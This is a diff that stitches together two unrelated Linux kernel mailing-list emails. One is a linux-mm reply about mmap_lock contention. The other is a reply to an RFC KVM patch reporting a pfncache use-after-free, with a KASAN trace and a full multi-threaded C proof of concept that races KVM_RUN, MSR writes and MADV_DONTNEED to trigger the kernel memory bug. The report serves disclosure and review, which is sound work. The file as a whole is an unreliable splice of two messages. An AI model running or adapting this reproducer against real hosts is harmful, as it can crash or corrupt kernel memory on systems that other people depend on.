@@ -4,123 +4,75 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id ECD9DCDB466
-	for <linux-arm-kernel@archiver.kernel.org>; Sat, 20 Jun 2026 23:49:22 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id DD723CD4F26
+	for <linux-arm-kernel@archiver.kernel.org>; Sun, 21 Jun 2026 00:03:11 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
 	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Transfer-Encoding:
-	Content-Type:Cc:To:Subject:Message-ID:Date:From:In-Reply-To:References:
-	MIME-Version:Reply-To:Content-ID:Content-Description:Resent-Date:Resent-From:
-	Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
-	bh=LVrIryE2VF1sDSS46HMWn0Px6aDg+06V1VeyZcyjwRw=; b=NzkCc3qRNTOlL0B65bZpLffAUQ
-	zwfA5U2YfNyDZL/GlZQwQpYTVZF8ua3UOfMAyPuGD/MiVzEmW3XfV+uKrrHVd/Fn6nEOvP0hILNf2
-	SGeORCeukmUzaU0BNC6O39B8VTW5VxzmlS8bBfy8x03sz64S7bawlav4Y1HK0SqL1e02eaOzaMGWp
-	EIuMlylrkZ40kEyLNXQRJOqB0/UREWH0ipr13thQHkBNRbW0VLqfwFycpyu7UyF7IO9RSAiMdKfUX
-	fRlwYOEdsE4Kan6prHUZOFLr4ARWEQ9ycjDJJeCzknhUOZh3gTt2IRAamCs9MYCrNKQeCM0HXwV+i
-	9BFqOLNQ==;
+	Content-Type:In-Reply-To:From:References:To:Subject:MIME-Version:Date:
+	Message-ID:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:Resent-From
+	:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
+	bh=vybCqDg9hWmZlNrhFz29JdNO2ituUhIKv68GCKK1pIE=; b=BGi6EhapaSJ+2P9QhRp7YtGg//
+	Dmda5vdKQ8W11wM+XHmxTyC9HT4lZ7tzDqu17d1oIIi+kfhqM5s81th78IrxrnlKhrypUZv7dB4ST
+	AWU3yAWsNCX661YBlhcT/FanoudSnzVEoFf9vN2TXAYJ9NiDlFxAT0soLuhOzs0lsKHAA47amwsqH
+	xRynG/2/Eo6/mPZisuHkhcN8/pAw6MyLKtI1YKo2ZinHhws5V1RX6rzz1D7Hj32C8NCGh7QWmWvTz
+	XaSip4YW5XAx+XiTzLUJxVSELUGAxxK7bHiNjQ2RQMKpfMWu49KTApy1odjzO/57BnPHmsMrIIZJo
+	7avWLH/Q==;
 Received: from localhost ([::1] helo=bombadil.infradead.org)
 	by bombadil.infradead.org with esmtp (Exim 4.99.1 #2 (Red Hat Linux))
-	id 1wb5R3-00000003dcO-3Iat;
-	Sat, 20 Jun 2026 23:49:13 +0000
-Received: from mail-qt1-x834.google.com ([2607:f8b0:4864:20::834])
+	id 1wb5eO-00000003e3L-0uT8;
+	Sun, 21 Jun 2026 00:03:00 +0000
+Received: from xmbghk7.mail.qq.com ([43.163.128.54])
 	by bombadil.infradead.org with esmtps (Exim 4.99.1 #2 (Red Hat Linux))
-	id 1wb5R1-00000003dbi-2bUL
+	id 1wb5eK-00000003e2u-1eQa
 	for linux-arm-kernel@lists.infradead.org;
-	Sat, 20 Jun 2026 23:49:12 +0000
-Received: by mail-qt1-x834.google.com with SMTP id d75a77b69052e-519ed52bcc6so339701cf.0
-        for <linux-arm-kernel@lists.infradead.org>; Sat, 20 Jun 2026 16:49:10 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1781999349; cv=none;
-        d=google.com; s=arc-20260327;
-        b=bI2Yg3QZKrM9UCMlUVTd6LxW4UnSzIV213/Hm3/y+6vU5/SICmQ0ViQ/RfxUa7KPBn
-         YdZDeOhqZQ2lY2t6iHWfvJ7tD80JxoR4MXml74tHLzwjmx0VvLKe8OkUktzQvu/bgG6m
-         OMjr8s2aSAH5as62Gp28hdHKDp1w/L8c/seCyt7Cxl3phbO8onFfhZe3e2n4kWq88Xk3
-         ZBOjjwawYEoC42wInWekDdN1y9KFl5fjmwa81T3KhHqW+gTsvmEdeW5ntz3sEdPXYa+M
-         lI9OsjXL4T58/uYwMQxjCC8IUrRCm7mg/ymNrx+pSLgIjeTK+MjocSJ5frEedqKogY32
-         DFLw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=LVrIryE2VF1sDSS46HMWn0Px6aDg+06V1VeyZcyjwRw=;
-        fh=uBfgXLmk/88heXxZgxLqwgkmFUvnlVPkRtQbq6pDsEo=;
-        b=fnXwgiKzGiowY5i30GM57YXVBErQiu6ArQJm5NGmqLT3m1hW7OMp9onucpcn34Ug0V
-         BZ65KqdsIKxKbGZCC7UKfTFdlynl8C5ekHQV6CkW64dvLNepuvJ3KZqXD1KXQAssn8mo
-         EsDI52tcEGvoLVooGibTa1N+D0zcGsZDf4x3F9PP5Vi1Jd7vI+nqZ0XkhDTG0rQegibt
-         Uwx8MZMlajxB+gekmkVrIUYO3Ec9DYGeuE8ugnxN8Zm388w4yOra9Su2rz4R9taUU6IB
-         X3foks11OfAtZWn1yJPsDFeyqihuUJaHqAqYtWgps94Io5u33kej7o1KO4dp5Kiz6m2K
-         ffTg==;
-        darn=lists.infradead.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20251104; t=1781999349; x=1782604149; darn=lists.infradead.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=LVrIryE2VF1sDSS46HMWn0Px6aDg+06V1VeyZcyjwRw=;
-        b=Fe4pOa8bc2NXC+p3ak8QibgTjeiaOSXqIXt7XuZIVcFtlQwErXnhKgP3O4V53OSHtx
-         EebT3b6h1sS/AAM/weXKOjzvIRgnkV3GteIb8gPkgjbA59NoRf0t3pDWIwALIxe0tf0X
-         W4OxU+SXcFzl8jSyJYz77XnZqwU5hRPkJ7RTrPD5JtOt34lwMeSzq06vncwgtJZ8jgz4
-         cZNT1DyRouP1HlTXHB/gbf/hp5q4WgIk3Ap6OTJllMN4xpiLzbWi8vsijwWR8JKPPMlk
-         YJJ7Jwm3AABOSoHdL7qxtQlZh0LjBB4moe9Bqw65yU5HypHr6x1X3tU2ONvdK31EhP7E
-         dHWA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1781999349; x=1782604149;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=LVrIryE2VF1sDSS46HMWn0Px6aDg+06V1VeyZcyjwRw=;
-        b=MpX81NR3JQX8maSCtRe/fuin4VlnU91kZ/L1lTnr2+54rDYHdvkA+C1mFrPmGEeBCa
-         QC0RH+gGRWyqoCzu2879E8es+FzUtsU3Ks3DVUdDgf084xR2U503EtPzky0DWMuNeECz
-         gN6gpGfQYBjiD0blez1H+FsWFgodfL/MyqEgfajYtXvsq9UxFs6cJxk5OaqjjIzZUB3O
-         QMUG8kWoFPP0d0rqARaNhL8CL5ob6QZBXmMA5Hc/xeIIWACkd+hKzE5x493+3uYKWNzc
-         vNeIndJ1i43WVyCkOQN2k22CNKufKQj+jpUhExsN+kbCvIAd5Ht4DmD6+gyaxinvn3oQ
-         ySWg==
-X-Forwarded-Encrypted: i=1; AFNElJ84+t0pD+sdke6EhmPTQjcZyLn1EAtneRPjCAKCmXf9Gyc1F/E3t0zdQ4tRu0EFHs9+ttDluErZ4/LVIUcQbcvl@lists.infradead.org
-X-Gm-Message-State: AOJu0YwoA/sP5rXCM9qFfHoD16mt8tAecdAQwtOpTwHhvzTrTbVNlGKt
-	9C/Jz71MyjjZg9GU7kOmp80Cxu2+8jtd8JzK20oC1rYuwSXalGyUZQtbH0//8k4h4R2Su1KCgKZ
-	fshnOkLpW85jEqGDcELWkrZzrSO4SO2z0h1H4Mr/V
-X-Gm-Gg: AfdE7ckyinDeEiiyc1KiaY06n9FSNGaMOph05lwheGOnSOAAxKCDNn2OYC/eH0iDMMb
-	vnuTNZM6zqkOgzZU5z6XIyli3njUOhBh6XVnxH/oUA9680uf3RGq1vVVxdraV36LluBWVZPFODB
-	ChjkOpTszaDkFCCK8P/X4h9f/B4JO5AXfhGkfTnOwIwSNL1BCJJ1wFGXBLqhUGLU0HA8t/qLwr/
-	GRK5KcGBaL6Uh7XAKIcc01K7Zn/JU93bZC7GHOYwzRnnd/m6PrN/t1CF0V+SJ6AAcPvblQaBtkU
-	ejm5yA==
-X-Received: by 2002:a05:622a:580a:b0:516:4f62:85f1 with SMTP id
- d75a77b69052e-519e4a744d4mr15890001cf.22.1781999348457; Sat, 20 Jun 2026
- 16:49:08 -0700 (PDT)
+	Sun, 21 Jun 2026 00:02:58 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1782000168; bh=vybCqDg9hWmZlNrhFz29JdNO2ituUhIKv68GCKK1pIE=;
+	h=Date:Subject:To:References:From:In-Reply-To;
+	b=L2VjciTUQaPakfGZjn9TxPFCaiK97akAD4B6vblO2QYtVpoS7KNK/l4d3h9Lk0ja2
+	 0Mfh3bsHHaz01eZaA0if+Sm7/KMfM6yNhxY1T5G3bt523RfF2iTUbP1spW1lGk9lEV
+	 l/ywrVL1RiVhqn5Ukf04QG6JYyp2RghNaHMaNEWQ=
+Received: from [192.168.1.100] ([183.95.73.181])
+	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
+	id ADA4832; Sun, 21 Jun 2026 08:02:45 +0800
+X-QQ-mid: xmsmtpt1782000165ts5upz1q4
+Message-ID: <tencent_EFE0DC1B0750A4CB1C783F920F91CF10E309@qq.com>
+X-QQ-XMAILINFO: Nwte6vbuj0EqbknLZeEA4uc//0lXfg3aCZT28xlvppfzvfRWlcS17m5Mv2gmnM
+	 yDijvPooVf/2FSfVkWqbuVR4B6lQKTfdLQzfp/3lmlnYr55GHc1zdoenps6igG7+wnz0VELYEQTM
+	 /8e6Q4YtZCRzB83F8wnyyfd5RWqIrtV2efZLPqoButCTNfZA1j5zMPzv9NhP8HbWbybBzu1ClL98
+	 35sQomuc4SVH1lyY/DauVxfPJ2MbcrhS+fLrj0pubS0LkhX8uasdW1v4iV1eRzOU+AcPDrF0Jnsi
+	 uffGkxJW0OevkWmfWJ6tlqnHq4OKXjn8QIceLhsWQnLYHi8yAbApjBdXMBz/K6veY/13d5vjwQ1n
+	 WsmyK0jizKud5tdMvlpsUFjGhpS2sIxzc6FfIksFsTxRZlJ02F4BQ0230IXXPpPn2vVPxXbcKZY2
+	 GkyuQnt49LKiSJNvVWnOC27q2/1awSHyo2X2hIPvUoeRSSnaSnATTlMnlb8NYJMISWrR8qZmbxb8
+	 y37fvr6Xzms2A8N3jsKZ4I9JqJfaQVK88ynLr6XylkTHQupj9HwlZrJP1TBPtScCS1IHUbzsEoeI
+	 jYlK5cyDwGLs26M0sPILMeCwKDFUAgzBtoLcBVoT/y4V97pZq1afnLuHOhN5OsLosGcTwP+TyJGt
+	 Ni7e/ZTdAaRVNPAANXK5CQCNvlUro+HzSylBQYy/ZGFDKJ9K9+NpPCMCqqrjJi8lJ4w43cBY7cYR
+	 Gse+RGbXFQ+Fn5oLJfZgZRKievzzUDMHlHarzLhHXkA6QNcqURmcnKOwkIBVk39L10gulYmh7xlB
+	 McL/vMhpcPV6ECBYqcCU0Nr+rc3K7u6SBxsb8vA3Myvx5ehGHZfA7CNu+zOUKp3OmiB0NEnDCBXW
+	 iOenuq/yrrSJ257zWmw4/SNXAaZyHrW2KnqjJUfhpXip+6sz6shAhskTXGWxIxE6pwD0xpUfFGjm
+	 Y87B21fcqpCL3TZHeiu4292tyHcuiIqVOlxkIAbu5nqzYBxzpY0hfFOfv8ISjN5QxjU7Gz/6wxmr
+	 iGYXyUwgxDM5qajlmPmIWhWlxarJ6RPa4hRNhhOa6H/hOETGSI
+X-QQ-XMRINFO: MSVp+SPm3vtSI1QTLgDHQqIV1w2oNKDqfg==
+X-OQ-MSGID: <4babccaf-90b5-4bf6-8f82-7e5677fef024@qq.com>
+Date: Sun, 21 Jun 2026 08:02:45 +0800
 MIME-Version: 1.0
-References: <CAGsJ_4zqLfdWoTH9s7FFaqWWj0mESfikYgr7=GcV64qcuXrPxA@mail.gmail.com>
- <CAJuCfpE0WQrB3zJp9qn3jvn5DthS=ttpX7gJJvyEhA_BJGrp5g@mail.gmail.com>
- <CAGsJ_4zgeE3ebEJ+j7GJFzWVoVYHeiOn4dOoOsmWCLA6s=oECQ@mail.gmail.com>
- <5zdaa5uv5oj27q3taopl3amops57ouxgyfsdveudz4ovmbdw7z@6lwrlyvmhcp2>
- <CAGsJ_4yKxg1QugcsJi3WD0KVGJKe-zXycgm5D6cRi9vWtNcpDQ@mail.gmail.com>
- <ag4h87CBd-gph9zX@casper.infradead.org> <CAGsJ_4zA8afu0xXy0WS+tMe-eesDX1W6UBmfAsuouUpcAgK8JQ@mail.gmail.com>
- <ag4kj84EcKqamdB-@casper.infradead.org> <3be9475b-0e8a-4df8-a130-4262f993973d@kernel.org>
- <CAGsJ_4xC5LdhuoWV1=tK-RZ5rkjc8aOKOkmb1L_8BG_3gtJhDg@mail.gmail.com>
- <ahB6QyHgYq8ksj65@lucifer> <CAGsJ_4zxLvZ01i19vdo0xA47T1hxa1VRYvxLmiDhy5q1GDKPRg@mail.gmail.com>
-In-Reply-To: <CAGsJ_4zxLvZ01i19vdo0xA47T1hxa1VRYvxLmiDhy5q1GDKPRg@mail.gmail.com>
-From: Suren Baghdasaryan <surenb@google.com>
-Date: Sat, 20 Jun 2026 16:48:57 -0700
-X-Gm-Features: AVVi8CdrqLszoGfh6nxxBjM6ZU4jlgAaXlfN0swetCJNc_4l9-uU6mX0T8CUJHo
-Message-ID: <CAJuCfpHTxaU4KdNmefU7C7cWZSLCFDLPdUrnqV6yzxzN+8RQ0Q@mail.gmail.com>
-Subject: Re: [PATCH v2 0/5] mm: reduce mmap_lock contention and improve page
- fault performance
-To: Barry Song <baohua@kernel.org>
-Cc: Lorenzo Stoakes <ljs@kernel.org>, "David Hildenbrand (Arm)" <david@kernel.org>, 
-	Matthew Wilcox <willy@infradead.org>, "Liam R. Howlett" <liam@infradead.org>, akpm@linux-foundation.org, 
-	linux-mm@kvack.org, vbabka@kernel.org, rppt@kernel.org, mhocko@suse.com, 
-	jack@suse.cz, pfalcato@suse.de, wanglian@kylinos.cn, chentao@kylinos.cn, 
-	lianux.mm@gmail.com, kunwu.chan@gmail.com, liyangouwen1@oppo.com, 
-	chrisl@kernel.org, kasong@tencent.com, shikemeng@huaweicloud.com, 
-	nphamcs@gmail.com, bhe@redhat.com, youngjun.park@lge.com, 
-	linux-arm-kernel@lists.infradead.org, linux-kernel@vger.kernel.org, 
-	loongarch@lists.linux.dev, linuxppc-dev@lists.ozlabs.org, 
-	linux-riscv@lists.infradead.org, linux-s390@vger.kernel.org, 
-	Nanzhe Zhao <nzzhao@126.com>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mozilla Thunderbird
+Subject: Re: [RFC PATCH] KVM: Ignore MMU notifiers for guest_memfd-only
+ memslots
+To: Alexandru Elisei <alexandru.elisei@arm.com>, pbonzini@redhat.com,
+ kvm@vger.kernel.org, linux-kernel@vger.kernel.org, maz@kernel.org,
+ oupton@kernel.org, suzuki.poulose@arm.com, kvmarm@lists.linux.dev,
+ linux-arm-kernel@lists.infradead.org, seanjc@google.com,
+ david.hildenbrand@arm.com, mark.rutland@arm.com
+References: <20260615155244.183044-1-alexandru.elisei@arm.com>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <20260615155244.183044-1-alexandru.elisei@arm.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.9.0 (BSD) ) MR-646709E3 
-X-CRM114-CacheID: sfid-20260620_164911_705550_E1C35826 
-X-CRM114-Status: GOOD (  26.65  )
+X-CRM114-CacheID: sfid-20260620_170256_770456_F6C7EAA9 
+X-CRM114-Status: GOOD (  19.70  )
 X-BeenThere: linux-arm-kernel@lists.infradead.org
 X-Mailman-Version: 2.1.34
 Precedence: list
@@ -135,75 +87,232 @@ List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-arm-kernel>,
 Sender: "linux-arm-kernel" <linux-arm-kernel-bounces@lists.infradead.org>
 Errors-To: linux-arm-kernel-bounces+linux-arm-kernel=archiver.kernel.org@lists.infradead.org
 
-On Fri, May 22, 2026 at 2:31=E2=80=AFPM Barry Song <baohua@kernel.org> wrot=
-e:
->
-> >
-> > Again this is making me want to sit outside and sip on some lemonade an=
-d
-> > ice :)
-> >
-> > Yes - android processes are aggressively multi-threaded, sure of course=
-.
-> >
-> > The missing bit here is the forking - what, where, why, when?
-> >
->
-> I really want to know the what, where, why, and when
-> as well. But since most applications are not
-> open-source, it is basically a black hole for anyone
-> other than the owners of those apps.
->
-> Let me try to do more investigation to understand what
-> is going on, although it is really hard.
-> To be honest, I would rather the Android framework
-> completely prohibit apps from calling fork(), if
-> possible.
->
-> > And then you say zygote is sometimes multi-threaded but sometimes
-> > single-threaded, which is adding a whole bunch of confusion on top of a=
-ll
-> > that.
-> >
-> > I don't find these stack trace dumps all that useful (though thanks of
-> > course for taking the time to gather them), I think we'd be better off =
-with
-> > specific data on forking, in some _concise_ _summarised_ form, ideally =
-with
-> > numbers.
-> >
-> > There's such a thing as too much information :))
->
-> This trace shows PF I/O in one thread overlapping
-> with a fork() call in another thread.
-> But as I explained, I really do not know what kind of
-> user behavior is behind it.
->
-> >
-> > Anyway, again, please let's see a new _RFC_ with the approach proposed =
-by
-> > Suren, with some _succinct_ data demonstrating _exactly_ what the probl=
-em
-> > is, so we can make some headway here.
->
-> Okay, sure. Thanks for your patience.
+Hi
 
-Just checking in on the followup plans. IIUC the RFC mentioned will
-try to implement the solution we discussed at LSFMM: splitting
-VM_FAULT_RETRY into two flags - one for retrying under per-VMA locks
-and another one to fallback to mmap_lock.
+I came across the Sashiko review in this thread and wanted to see if
+the pfncache UAF could be triggered in practice.  The short answer is:
+yes, it reproduces reliably with a multi-threaded PoC.  Below is the
+KASAN report and a brief description of the reproducer.
 
-Barry, if you need any help or clarification, please do not hesitate
-to contact me.
+On Mon, Jun 15, 2026 at 04:52:44PM +0100, Alexandru Elisei wrote:
+ > For guest_memfd-only memslots (kvm_memslot_is_gmem_only() is true), the
+ > memory provider for the virtual machine is the guest_memfd file, not the
+ > userspace mapping.
+...
+ > @@ -592,6 +592,10 @@ static __always_inline kvm_mn_ret_t 
+kvm_handle_hva_range(struct kvm *kvm,
+ >              unsigned long hva_start, hva_end;
+ >
+ >              slot = container_of(node, struct kvm_memory_slot, 
+hva_node[slots->node_idx]);
+ > +
+ > +            if (kvm_slot_has_gmem(slot) && 
+kvm_memslot_is_gmem_only(slot))
+ > +                continue;
+ > +
+
+This `continue` is the problem.  When the only memslot covering the
+HVA range is gmem-only, found_memslot stays false, and in
+invalidate_range_end, kvm_mmu_invalidate_end() is never called.
+That means mmu_invalidate_seq never increments.
+
+Meanwhile, the pfncache (used for guest pvclock) runs this retry
+protocol in hva_to_pfn_retry():
+
+     1. Capture mmu_seq
+     2. Drop gpc->lock
+     3. GUP + kmap (gets a page reference, creates kernel mapping)
+     4. kvm_release_page_clean(page) — drops the reference
+     5. Re-acquire gpc->lock
+     6. mmu_notifier_retry_cache() — checks if mmu_seq changed
+
+If step 6 sees the same seq, the stale kmap is kept even though the
+page was freed after step 4.  This is the UAF.
+
+[Reproduction]
+
+I rebuilt the kernel with CONFIG_KASAN=y and ran the PoC in a QEMU VM.
+The trigger is three threads racing concurrently:
+
+   - Thread 1 (T0): hammers KVM_RUN ioctls, forcing
+     kvm_guest_time_update → kvm_gpc_refresh → hva_to_pfn_retry
+   - Thread 2 (T1): cycles KVM_SET_MSRS to activate/deactivate the
+     pvclock pfncache, extending the race window
+   - Thread 3 (T2): hammers MADV_DONTNEED + write on the HVA, firing
+     MMU notifier invalidations while the memslot is gmem-only
+
+The full PoC source (poc.c) is attached at the end of this mail.
+Compiled with: gcc -o poc poc.c -static -lpthread
+
+[KASAN report — kernel 7.1.0-g0eb81d7f81ae #1, CONFIG_KASAN=y]
+
+   ==================================================================
+   BUG: KASAN: use-after-free in kvm_setup_guest_pvclock+0x632/0x680
+   Read of size 4 at addr ffff888116069000 by task poc/9520
+
+   CPU: 1 UID: 0 PID: 9520 Comm: poc Not tainted 7.1.0-g0eb81d7f81ae #1
+
+   Call Trace:
+    <TASK>
+    dump_stack_lvl+0x116/0x1f0
+    print_report+0xf4/0x600
+    kasan_report+0xe0/0x110
+    kvm_setup_guest_pvclock+0x632/0x680
+    kvm_guest_time_update+0x741/0x1090
+    vcpu_run+0x1c2a/0x5a80
+    kvm_arch_vcpu_ioctl_run+0x1029/0x18d0
+    kvm_vcpu_ioctl+0x772/0x1710
+    __x64_sys_ioctl+0x193/0x210           ← KVM_RUN
+    do_syscall_64+0x129/0x880
+    entry_SYSCALL_64_after_hwframe+0x77/0x7f
+
+   The buggy address belongs to the physical page:
+   page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x7ff24ab46
+
+   page last allocated via:
+    get_user_pages_unlocked → hva_to_pfn → __kvm_gpc_refresh
+      → kvm_gpc_refresh → kvm_setup_guest_pvclock
+
+   page last free pid 9520 tgid 9517 stack trace:
+    kvm_release_page_clean → __folio_put → __free_frozen_pages
+      ← __kvm_gpc_refresh ← kvm_gpc_refresh
+
+The allocation and free traces confirm the exact scenario from the
+review: the page is allocated by GUP during gpc refresh, then freed by
+kvm_release_page_clean() inside the same __kvm_gpc_refresh() call,
+and then kvm_setup_guest_pvclock still accesses it through the stale
+kmap.
+
+The crash reproduces within ~40 seconds of the PoC running.
+
+[Full PoC source]
+
+Compile: gcc -o poc poc.c -static -lpthread
+
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+  * PoC for: KVM MMU notifier skip regression for guest_memfd-only memslots
+  *
+  * Concurrent threads create a race between gpc refresh (GUP → kmap →
+  * kvm_release_page_clean → retry check) and MMU invalidation (munmap /
+  * MADV_DONTNEED) on a gmem-only memslot where the invalidation doesn't
+  * increment mmu_invalidate_seq.
+  */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <signal.h>
+#include <stdint.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <pthread.h>
+#include <linux/kvm.h>
+
+#ifndef KVM_CAP_GUEST_MEMFD
+#define KVM_CAP_GUEST_MEMFD 234
+#endif
+#ifndef GUEST_MEMFD_FLAG_MMAP
+#define GUEST_MEMFD_FLAG_MMAP (1ULL << 0)
+#endif
+#ifndef MSR_KVM_SYSTEM_TIME_NEW
+#define MSR_KVM_SYSTEM_TIME_NEW 0x4b564d01
+#endif
+
+#define PAGE_SIZE 4096
+
+static volatile bool stop = false;
+static int vcpu_fd = -1;
+static unsigned long shared_hva = 0;
+
+static void sigint_handler(int sig) { stop = true; }
+
+static void *worker_thread(void *arg)
+{
+     int tid = (int)(long)arg;
+     for (int i = 0; !stop && i < 200000; i++) {
+         if (tid == 0)
+             ioctl(vcpu_fd, KVM_RUN, 0);
+         else if (tid == 1) {
+             struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
+sizeof(msrs->entries[0]));
+             if (msrs) {
+                 memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
+                 msrs->nmsrs = 1;
+                 msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
+                 msrs->entries[0].data = (i & 1) ? 0x1001 : 0x1000;
+                 ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
+                 free(msrs);
+             }
+         } else {
+             madvise((void*)shared_hva, PAGE_SIZE, MADV_DONTNEED);
+             *(volatile char*)shared_hva = 0x42;
+         }
+         if (i % 50000 == 0)
+             printf("[T%d] %d iterations\n", tid, i);
+     }
+     printf("[T%d] Done\n", tid);
+     return NULL;
+}
+
+int main(void)
+{
+     signal(SIGINT, sigint_handler);
+     signal(SIGTERM, sigint_handler);
+
+     int kvm_fd = open("/dev/kvm", O_RDWR);
+     int vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, 0);
+
+     struct kvm_create_guest_memfd gmem_cmd = { .size = PAGE_SIZE, 
+.flags = GUEST_MEMFD_FLAG_MMAP };
+     int gmem_fd = ioctl(vm_fd, KVM_CREATE_GUEST_MEMFD, &gmem_cmd);
+
+     void *anon = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
+                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
+     memset(anon, 0xAA, PAGE_SIZE);
+     shared_hva = (unsigned long)anon;
+
+     struct kvm_userspace_memory_region2 mem = {
+         .slot = 0, .flags = KVM_MEM_GUEST_MEMFD,
+         .guest_phys_addr = 0x1000, .memory_size = PAGE_SIZE,
+         .userspace_addr = shared_hva,
+         .guest_memfd_offset = 0, .guest_memfd = gmem_fd,
+     };
+     ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION2, &mem);
+
+     vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, 0);
+     size_t mmap_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
+     struct kvm_run *vcpu_run = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE,
+                                     MAP_SHARED, vcpu_fd, 0);
+
+     /* Pre-activate pfncache via MSR */
+     struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
+sizeof(msrs->entries[0]));
+     memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
+     msrs->nmsrs = 1;
+     msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
+     msrs->entries[0].data = 0x1001;
+     ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
+     free(msrs);
+
+     pthread_t threads[3];
+     for (int i = 0; i < 3; i++)
+         pthread_create(&threads[i], NULL, worker_thread, (void *)(long)i);
+
+     sleep(40);
+     stop = true;
+     for (int i = 0; i < 3; i++)
+         pthread_join(threads[i], NULL);
+
+     printf("[*] Done. Check dmesg for KASAN UAF.\n");
+     return 0;
+}
+
 Thanks,
-Suren.
+XIAOWU
 
->
-> >
-> > And now I'm off for a cornetto! :)
->
-> Sounds good :) Enjoy your cornetto!
->
-> Best Regards
-> Barry
+
 
